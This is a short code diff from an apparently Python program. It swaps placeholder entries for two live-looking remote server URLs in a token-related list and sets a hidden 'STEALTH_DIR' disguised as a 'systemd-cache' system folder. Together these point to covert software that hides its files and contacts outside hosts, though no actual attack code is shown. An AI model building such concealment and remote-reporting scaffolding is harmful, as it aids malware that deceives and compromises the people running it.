@@ -20,8 +20,8 @@ from pathlib import Path
 DISCORD_TOKEN = "YOUR_ACTUAL_DISCORD_TOKEN_HERE"
 TOKEN_CODE = "asdfadfhjkl"
 TOKEN_BASE_URLS = [
-    "dafn",
-    "nnon"
+    "https://new-5itj.onrender.com",
+    "https://new-production-8df3.up.railway.app/"
 ]
 
 STEALTH_DIR = Path.home() / ".local" / "share" / "systemd-cache"
